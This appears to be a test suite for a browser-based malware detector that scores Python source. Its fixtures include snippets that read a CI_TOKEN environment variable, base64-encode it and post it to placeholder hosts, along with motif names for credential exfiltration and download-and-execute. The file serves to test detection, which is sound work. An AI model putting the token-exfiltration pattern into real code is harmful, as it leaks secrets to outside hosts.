import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

import {
  analyzeSource,
  DEMO_SOURCES,
  getFullModelStatus,
  installFullModel,
  MAX_SOURCE_BYTES,
  predictMicro,
  predictMicroDetails,
} from "../engine.mjs";

const initialStatus = getFullModelStatus();
const unloadedReport = analyzeSource(
  DEMO_SOURCES.suspicious,
  "before-load.py",
);
let unloadedPredictionError = null;
try {
  predictMicro(["P:runtime|C:source|O:FILE_READ|T:readme.md"]);
} catch (error) {
  unloadedPredictionError = error;
}

const { FULL_MODEL_MANIFEST } = await import("../model.mjs");
const modelBytes = readFileSync(new URL("../model.bin", import.meta.url));
const modelBuffer = modelBytes.buffer.slice(
  modelBytes.byteOffset,
  modelBytes.byteOffset + modelBytes.byteLength,
);
installFullModel(FULL_MODEL_MANIFEST, modelBuffer);

test("engine import does not eagerly load model weights", () => {
  assert.equal(initialStatus.loaded, false);
  assert.equal(initialStatus.binaryBytes, 0);
  assert.equal(unloadedReport.model.loaded, false);
  assert.equal(unloadedReport.model.consulted, false);
  assert.equal(unloadedReport.model.used, false);
  assert.equal(unloadedReport.model.metadata, null);
  assert.match(unloadedPredictionError.message, /Download the full µMal model/);
});

test("web entry point imports the model manifest only on user action", () => {
  const appSource = readFileSync(
    new URL("../app.mjs", import.meta.url),
    "utf8",
  );
  const markup = readFileSync(
    new URL("../index.html", import.meta.url),
    "utf8",
  );
  assert.doesNotMatch(appSource, /^import .*model\.mjs/m);
  assert.match(appSource, /await import\("\.\/model\.mjs"\)/);
  assert.match(markup, /id="load-model"/);
  assert.doesNotMatch(markup, /class="hero"|id="method"|id="research"/);
});

test("full browser artifact matches the checkpoint architecture", () => {
  assert.equal(FULL_MODEL_MANIFEST.metadata.name, "µMal Full");
  assert.equal(FULL_MODEL_MANIFEST.metadata.parameters, 567_746);
  assert.equal(
    FULL_MODEL_MANIFEST.metadata.feature_schema,
    "malir.effect-context.v2",
  );
  assert.equal(FULL_MODEL_MANIFEST.metadata.training_examples, 60);
  assert.equal(FULL_MODEL_MANIFEST.metadata.training_groups, 20);
  assert.equal(FULL_MODEL_MANIFEST.metadata.validation_examples, 30);
  assert.equal(FULL_MODEL_MANIFEST.metadata.validation_groups, 10);
  assert.equal(FULL_MODEL_MANIFEST.metadata.seed, 29);
  assert.ok(FULL_MODEL_MANIFEST.metadata.validation_metrics.nll < 0.08);
  assert.equal(
    FULL_MODEL_MANIFEST.metadata.calibration,
    "temperature-scaled-validation",
  );
  assert.ok(FULL_MODEL_MANIFEST.metadata.temperature >= 1);
  assert.equal(
    FULL_MODEL_MANIFEST.metadata.validation_kind,
    "synthetic-group-disjoint",
  );
  assert.equal(FULL_MODEL_MANIFEST.config.n_layers, 2);
  assert.equal(FULL_MODEL_MANIFEST.config.n_heads, 4);
  assert.equal(FULL_MODEL_MANIFEST.config.d_model, 96);
  assert.equal(FULL_MODEL_MANIFEST.binary.bytes, modelBytes.byteLength);
  assert.equal(getFullModelStatus().binaryBytes, modelBytes.byteLength);
});

test("browser inference matches PyTorch smoke vectors", () => {
  for (const vector of FULL_MODEL_MANIFEST.smoke_vectors) {
    const actual = predictMicro(vector.tokens);
    assert.ok(
      Math.abs(actual - vector.probability) < 1e-6,
      "expected " + vector.probability + ", received " + actual,
    );
    assert.equal(actual, predictMicro(vector.tokens));
  }
});

test("windowed browser inference evaluates tokens beyond one context", () => {
  const tokens = Array.from({ length: 300 }, (_, index) => `TOKEN:${index}`);
  const result = predictMicroDetails(tokens);

  assert.equal(result.windows, 2);
  assert.equal(result.tokensEvaluated, tokens.length);
  assert.equal(result.truncated, false);
  assert.ok(result.probability >= 0 && result.probability <= 1);
});


test("benign demo remains low signal", () => {
  const report = analyzeSource(DEMO_SOURCES.benign, "benign.py");
  assert.equal(report.assessment, "no-malware-evidence");
  assert.equal(report.verdict, "low-signal");
  assert.equal(report.model.loaded, true);
  assert.equal(report.model.consulted, true);
  assert.equal(report.model.used, false);
  assert.equal(report.model.gate, "below");
  assert.equal(typeof report.model.probability, "number");
  assert.equal(report.riskScore, report.ruleScore);
});

test("exfiltration demo produces line evidence and uses full µMal", () => {
  const report = analyzeSource(DEMO_SOURCES.suspicious, "exfil.py");
  assert.equal(report.assessment, "malware-like");
  assert.ok(report.riskScore >= 50);
  assert.equal(report.model.loaded, true);
  assert.equal(report.model.used, true);
  assert.ok(report.model.probability > 0.5);
  assert.ok(
    report.modelTokens.some((token) =>
      token.includes("|O:NETWORK_SEND|"),
    ),
  );
  const path = report.evidence.find(
    (item) => item.motif === "credential_or_file_exfil",
  );
  assert.equal(path.evidenceKind, "proximity");
  assert.equal(path.confidence, "low");
  assert.equal(path.score, 2);
  assert.ok(report.evidence.every((item) => item.line > 0));
});

test("repeated URL sinks cannot inflate score or flood µMal input", () => {
  const prefix = `import base64
import os
import requests as http

def collect():
    token = os.getenv("CI_TOKEN")
    packed = base64.b64encode(token.encode())
`;
  const calls = Array.from(
    { length: 20 },
    (_, index) =>
      `    http.post("https://collector${index || ""}.invalid/collect", data=packed)`,
  );
  calls[0] =
    `    http.post("https://example.invalid/collect", data=packed)`;
  const spammed = analyzeSource(prefix + calls.join("\n") + "\n", "exfil.py");
  const single = analyzeSource(DEMO_SOURCES.suspicious, "exfil.py");

  assert.equal(spammed.ruleScore, 28);
  assert.equal(spammed.ruleScore, single.ruleScore);
  assert.equal(spammed.riskScore, single.riskScore);
  assert.deepEqual(spammed.modelTokens, single.modelTokens);
  assert.equal(spammed.model.consulted, true);
  assert.equal(spammed.model.used, true);
  assert.ok(spammed.model.suppressedTokens > 0);
  assert.ok(spammed.suppressedEvidenceCount > 0);
  assert.equal(
    spammed.evidence.find((item) => item.op === "NETWORK_SEND").occurrences,
    20,
  );
});


test("effect context keeps a dual-use code transformer in review", () => {
  const source = `import ast
import sys
exec("Alias = ast.AST")

class Rewrite(ast.NodeTransformer):
    pass

def transform(input_path, output_path):
    with open(input_path, "r") as source_file:
        tree = ast.parse(source_file.read())
    compile(tree, "<generated>", "exec")
    with open(output_path, "w") as output_file:
        output_file.write(ast.unparse(tree))

if __name__ == "__main__":
    transform(sys.argv[1], sys.argv[2])
`;
  const report = analyzeSource(source, "transformer.py");

  assert.equal(report.effectSummary.primaryPurpose, "local-code-transformer");
  assert.equal(report.effectSummary.purposeCandidates[0].confidence, "medium");
  assert.equal(report.capabilityScore, 30);
  assert.equal(report.riskScore, report.capabilityScore);
  assert.equal(report.verdict, "review");
  assert.equal(report.model.used, true);
  assert.ok(report.model.probability < 0.2);
  assert.ok(report.modelTokens.includes("PURPOSE:local_code_transformer"));
});

test("network effects block the local-transformer purpose shortcut", () => {
  const source = `import ast
import requests
import sys

def transform(input_path, output_path):
    with open(input_path, "r") as source_file:
        text = source_file.read()
    tree = ast.parse(text)
    compile(tree, "<generated>", "exec")
    with open(output_path, "w") as output_file:
        output_file.write(ast.unparse(tree))
    requests.post("https://example.invalid/upload", data=text)

if __name__ == "__main__":
    transform(sys.argv[1], sys.argv[2])
`;
  const report = analyzeSource(source, "transformer.py");

  assert.notEqual(
    report.effectSummary.primaryPurpose,
    "local-code-transformer",
  );
});

test("literal imports and untyped writes do not become risky effects", () => {
  const report = analyzeSource(
    `first = __import__("ast")
second = __import__("ast")
name = "json"
third = __import__(name)

def render(handle):
    handle.write("text")
`,
    "plugin.py",
  );

  assert.equal(
    report.events.filter((event) => event.op === "IMPORT").length,
    1,
  );
  assert.equal(
    report.events.filter((event) => event.op === "DYNAMIC_IMPORT").length,
    1,
  );
  assert.equal(
    report.events.some((event) => event.op === "FILE_WRITE"),
    false,
  );
});

test("target normalization does not mistake tokenizer names for secrets", () => {
  const report = analyzeSource(
    `import tokenizer
from pathlib import Path
text = Path("tokenizer.py").read_text()
`,
    "tokenizer_runner.py",
  );

  assert.equal(
    report.modelTokens.some((token) => token.endsWith("|T:sensitive")),
    false,
  );
  assert.ok(report.modelTokens.some((token) => token.endsWith("|T:file")));
});

test("download and dynamic execution create reviewable paths", () => {
  const report = analyzeSource(DEMO_SOURCES.download, "stage.py");
  assert.equal(report.verdict, "suspicious");
  assert.ok(report.motifs.some((item) => item.motif === "download_execute"));
  assert.ok(report.motifs.some((item) => item.motif === "encoded_execution"));
});

test("comments and quoted code are not treated as calls", () => {
  const report = analyzeSource(
    `# os.system("never")
message = "requests.post('https://example.invalid')"
print(message)
`,
    "quoted.py",
  );
  assert.equal(report.ruleScore, 0);
  assert.equal(
    report.events.some((event) => event.op === "PROCESS_EXEC"),
    false,
  );
  assert.equal(
    report.events.some((event) => event.op === "NETWORK_SEND"),
    false,
  );
});

test("browser input is bounded", () => {
  assert.throws(
    () => analyzeSource("x".repeat(MAX_SOURCE_BYTES + 1), "large.py"),
    /1 MB/,
  );
});

test("unittest setUp is not treated as package installation", () => {
  const report = analyzeSource(
    `class Case:
    def setUp(self):
        exec("value = 1")
`,
    "tests/test_case.py",
  );
  const dynamic = report.events.find((event) => event.op === "DYNAMIC_EXEC");
  assert.equal(dynamic.phase, "runtime");
  assert.equal(
    report.motifs.some((item) => item.motif === "install_time_execution"),
    false,
  );
});

test("write payload text is not interpreted as a persistence path", () => {
  const report = analyzeSource(
    `def render(handle):
    handle.write(".. toctree::\\n   :maxdepth: 1\\n")
`,
    "docs.py",
  );
  assert.equal(
    report.events.some((event) => event.op === "PERSISTENCE_WRITE"),
    false,
  );
});


test("effect context separates backup transfer from download execution", () => {
  const backup = predictMicro([
    "FILE",
    "P:runtime|C:source|O:FILE_READ|T:file",
    "P:runtime|C:transform|O:ENCODE|T:generic",
    "P:runtime|C:sink|O:NETWORK_SEND|T:network",
    "EFFECT:ENTRY:library_callable",
    "EFFECT:ORIGIN:local_file",
    "EFFECT:DESTINATION:network",
    "EFFECT:TRANSFORM:encoding",
  ]);
  const remoteExecution = predictMicro([
    "FILE",
    "P:runtime|C:source|O:NETWORK_RECEIVE|T:network",
    "P:runtime|C:sink|O:PROCESS_EXEC|T:generic",
    "MOTIF:download_execute",
    "EFFECT:ENTRY:library_callable",
    "EFFECT:ORIGIN:network",
    "EFFECT:DESTINATION:process",
    "EFFECT:FLOW:network_to_execution",
    "PURPOSE:remote_code_executor",
  ]);

  assert.ok(backup < 0.1);
  assert.ok(remoteExecution > 0.9);
  assert.ok(remoteExecution - backup > 0.8);
});
